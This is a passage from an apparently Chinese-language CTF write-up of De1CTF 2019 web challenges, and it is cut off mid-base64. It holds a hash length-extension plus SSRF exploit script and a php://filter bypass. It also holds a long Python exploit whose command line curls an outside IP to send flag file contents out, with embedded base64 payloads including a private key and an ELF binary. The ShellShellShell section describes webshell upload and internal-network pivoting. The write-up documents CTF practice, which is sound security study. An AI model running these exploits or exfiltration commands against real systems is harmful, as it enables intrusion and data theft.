class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><ol><li>é»˜è®¤signçš„æ—¶å€™è¯•è®²actionè®¾ç½®ä¸ºscanæ¥è®²æ–‡ä»¶è¯»è¿›result.txtæ–‡ä»¶</li><li>éœ€è¦è®¾ç½®signä¸­çš„actionä¸ºreadï¼ˆhashæ‰©å±•æ”»å‡»ï¼‰</li><li>åˆ©ç”¨<a href="https://bugs.python.org/issue35907æ¥è¿›è¡Œssrfè¯»æ–‡ä»¶" target="_blank" rel="noopener">https://bugs.python.org/issue35907æ¥è¿›è¡Œssrfè¯»æ–‡ä»¶</a></li></ol><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> up</span><br><span class="line"></span><br><span class="line">readfile = <span class="string">'local_file:///proc/self/cwd/flag.txt'</span></span><br><span class="line">url1 =  <span class="string">'http://139.180.128.86/geneSign?param='</span> + readfile</span><br><span class="line">req = requests.get(url = url1)</span><br><span class="line">sign = req.content</span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, readfile + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">sign_next = hash_sign[<span class="number">0</span>]</span><br><span class="line">action_next = up.quote(hash_sign[<span class="number">1</span>][len(readfile):])</span><br><span class="line">url2 = <span class="string">'http://139.180.128.86/De1ta?param='</span>+readfile</span><br><span class="line">result = requests.get(url = url2, cookies=&#123;<span class="string">'sign'</span>: sign_next, <span class="string">'action'</span>: action_next&#125;)</span><br><span class="line">print(result.content)</span><br></pre></td></tr></table></figure></p><p>å®˜æ–¹è§£æ³•ï¼š<br><a href="https://github.com/De1ta-team/De1CTF2019/blob/8f981109d95af76456d1e59deab058f8a7bba3b0/writeup/web/SSRF%20Me/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/blob/8f981109d95af76456d1e59deab058f8a7bba3b0/writeup/web/SSRF%20Me/README_zh.md</a></p><h2 id="0x02-ShellShellShell"><a href="#0x02-ShellShellShell" class="headerlink" title="0x02 ShellShellShell"></a>0x02 ShellShellShell</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>hint : The flag file ,with â€œflagâ€ keyword ,is in the inside computer.(flagæ–‡ä»¶åœ¨å†…ç½‘çš„æœºå­ä¸Šï¼Œå¹¶ä¸”flagæ–‡ä»¶çš„æ–‡ä»¶åå¸¦æœ‰flagå…³é”®å­—)</p><p>shell me plz</p><h3 id="é¢˜ç›®è§£ç­”-1"><a href="#é¢˜ç›®è§£ç­”-1" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><p>å› ä¸ºå¯¹easy-phpè¿™é¢˜å°è±¡æ·±åˆ»ï¼Œæ‰€ä»¥çœ‹åˆ°é¢˜ç›®ä¹‹åç«‹é©¬å°±è”æƒ³åˆ°äº†ï¼Œæ‰€ä»¥è€å¥—è·¯èµ°ä¸€æ³¢ã€‚å‚è€ƒä¸‹é¢è¿™ä¸ªwpå¾ˆå®¹æ˜“å°±èƒ½getshell</p><p><a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540" target="_blank" rel="noopener">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540</a></p><p>è¿›åˆ°å†…ç½‘ä¹‹åå…ˆæŸ¥çœ‹<code>/etc/hosts</code>æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">172.18.0.3df459fa2cbad</span><br></pre></td></tr></table></figure></p><p>å‘ç°å¯¹åº”çš„å†…ç½‘åœ°å€ï¼Œä¹‹åä½¿ç”¨<strong>fcn</strong>ä»£ç†å‡ºæ¥ï¼Œåœ¨172.18.0.2ä¸Šçš„80ç«¯å£å‘ç°ä¸€ä¸ªä»£ç å®¡è®¡é¢˜ï¼Œé¢˜ç›®å‡ºè‡ªpwnhubï¼Œæ‰€ä»¥å‚è€ƒwpç›´æ¥ä¼ webshellä¹‹ååŒ…å«getshell</p><p><a href="https://cloud.tencent.com/developer/article/1360551" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1360551</a></p><p>ä¹‹å<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure></p><p>å³å¯å¾—åˆ°flag</p><p>PS: æˆ‘è§‰å¾—è¿™é¢˜çš„dockerfileå€¼å¾—ä¸€çœ‹</p><h2 id="0x03-cloudmusic-rev"><a href="#0x03-cloudmusic-rev" class="headerlink" title="0x03 cloudmusic_rev"></a>0x03 cloudmusic_rev</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>æ»‘ç¨½äº‘éŸ³ä¹å¹³å° 2.0 ä¸Šçº¿äº†ã€‚</p><p>Comical CloudMusis 2.0 is online.</p><h3 id="é¢˜ç›®è§£ç­”-2"><a href="#é¢˜ç›®è§£ç­”-2" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><p>é¦–å…ˆæƒ³åˆ°å›½èµ›å†³èµ›ä¸­å‡ºç°çš„1.0ç‰ˆæœ¬<br><a href="https://github.com/impakho/ciscn2019_final_web1" target="_blank" rel="noopener">https://github.com/impakho/ciscn2019_final_web1</a></p><p>ç„¶åæŒ‰ç…§è¿™ä¸ªå¥—è·¯åšé¢˜ï¼š</p><ol><li><p>é¦–å…ˆæ˜¯æ³¨å†Œè´¦å·å¤„ç†éªŒè¯ç ï¼Œè¿™é‡Œè¦æ±‚éªŒè¯ç æ˜¯6ä½ï¼Œæ‰€ä»¥æˆåŠŸæ³¨å†Œä¸€ä¸ªè´¦å·<code>adfasd1/123456aaaa</code></p></li><li><p>å³é”®æŸ¥çœ‹æºä»£ç å‘ç°ä»»æ„æ–‡ä»¶ä¸‹è½½</p><p><img src="https://i.loli.net/2019/08/11/RaYUscFLO6HJliW.png" alt="EE10D927-059B-4F33-AE11-6E1DB62D9524.png"></p></li></ol><ol start="3"><li>ä½†æ˜¯ä¸èƒ½ç›´æ¥ä¸‹è½½phpåç¼€çš„æ–‡ä»¶éœ€è¦bypass</li></ol><p>bypass:<br>(1) å°†<code>php://filter/read=convert.base64-encode/resource=../include/firmware.php</code> urlencodeæœ€å¥½ç”¨bpæ¥å®Œå…¨ç¼–ç <br>(2) base64ä¸‹è½½æºç </p><ol start="4"><li><p>å› ä¸ºä»£ç é‡Œé¢æ­¤å¤„çš„ä¸åŒ<br><code>$firmware_filename=md5(mt_rand().$_SERVER[&#39;REMOTE_ADDR&#39;]);</code><br>æ‰€ä»¥expé‡Œé¢è¦æ”¹æˆIP</p></li><li><p>ä¸Šä¼ æº¢å‡ºadminå¯†ç çš„é•¿åº¦å˜äº†ï¼Œä¹‹å‰æ˜¯0x300ï¼Œç°åœ¨æ˜¯0x70</p></li></ol><p><img src="https://i.loli.net/2019/08/11/3a7tZyfeSjDhTqX.png" alt="å±å¹•å¿«ç…§ 2019-08-04 ä¸‹åˆ11.22.38.png"></p><p><img src="https://i.loli.net/2019/08/11/XH2ULuawiWTcktf.png" alt="å±å¹•å¿«ç…§ 2019-08-04 ä¸‹åˆ11.13.03.png"></p><ol start="6"><li>ä¿®æ”¹ä¹‹å‰çš„expåç›²æ‰“å¾—åˆ°flag</li></ol><p>{â€˜usernameâ€™: â€˜adminâ€™, â€˜passwordâ€™: â€˜Mike84eiNxHcMVCzâ€™}</p><p><img src="https://i.loli.net/2019/08/11/kPiTbAh24oDrsRO.png" alt="å±å¹•å¿«ç…§ 2019-08-04 ä¸‹åˆ10.29.24.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">1.0</span></span><br><span class="line">retry_count = <span class="number">5</span></span><br><span class="line">logging = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">site_url = <span class="string">''</span></span><br><span class="line">s = requests.session()</span><br><span class="line">time_zone_offset = <span class="number">60</span> * <span class="number">60</span> * <span class="number">8</span></span><br><span class="line"><span class="comment"># command = "/usr/bin/tac /fl*g*"</span></span><br><span class="line">command = <span class="string">"curl http://47.90.204.28/`/usr/bin/tac /fl*g*`"</span></span><br><span class="line"><span class="comment"># command = "ls"</span></span><br><span class="line"></span><br><span class="line">preset_key = b64decode(<span class="string">'LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUNkd0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Fd2dnSmRBZ0VBQW9HQkFPTWp4eXVIcWRuSmFyUDAKSHl1eFVVRHkvY1BGaWMzYjM5WUQrVzY5R2VSRkpMRDUraFhaM3lYMTFBQ2pMSHpESFpIbGgrajRQZncxdEhMMApwY3FPZmJ0TTF4am5sV2FKd3lZQzRpWlBSRXJUTGNVd282UmhKS2diUkxHQVpLUmxmWFFMbVRwbGd0ZnJoUGhJCng0ZzM2ZEtLTVVlYjZnOHJ3blVrUnVYSVlhd2hBZ01CQUFFQ2dZRUEwUWZrQzFOV0pHOFFHM3ZXRThlakZ6cUgKL3RxVDd6Y2h6enJwR2RnOU02M09EbkIramcxckp1d01wbW1FVDJ6Z2tadkNiOHZFZjQ2TStoM2JWWVc4Zmg1Zwp4dTlXdmJFb0orUGZtV2R6SmowUlRYT05vZXVzRUgwODI3eGl6UXlIc21RbkNBQzkyUS9IQlg4WVl0eDgxN0pOCnNIUmNFMHdacVFmL0dkU0VnK0VDUVFEMGVjUlJYN3BsT0hTOHNjTjFqT3FOMEl5S2pvamljWWNQL2h3ckU2ZjIKZGR3dEpnNlJBb3E3SHlRdUFjYmZCazJwdS9UeDRsSHRycm9qRXlxQTRLdjdBa0VBN2RqUEFCakEvaHlpV1oxTQpDUm5DTTRudWdDUEE1SXRxZktzb3UvbE51cUdYZXFVYW5XNjBTcmJDVWJrM2g2NnkwdXV2T0xzendEWllONnNNClFEWFJrd0pBUlB3N1BtOFJ6TkF5ZUxCOHBDWUFaY1lNY21pb0RhWFZZOWpqbi9BcS9Ddmoxa1dmNUtGZi9rOWEKU1RVdEplL0VhSG5tTTM4V2VVaE5zK29MbTFSS2t3SkFNcCtyNTJ4ZFgzaSt3VzR1YWQxMnJUdVZiT2F2UHJYQgowNGttb1dPOXZKUjZSbHR2MzhSWlVYRzJ5R2d3dm90YmVuTTVsMHlaQmpkSzdZWlZsREVnU3dKQkFMb29yYmZnCkJzMW5BbGU3WnhXK0JkRXlLVG9ZUWdWVU1MRytWeDFITW9rU0dZNlh6blNFYzdpK25weFBoeGd6Q1VWdHpxNU4KR3E4Q3ppN2FJUFVuY0lnPQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg=='</span>)</span><br><span class="line">preset_music = b64decode(<span class="string">'SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJiYmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYWFhYQA='</span>)</span><br><span class="line">preset_firmare = b64decode(<span class="string">'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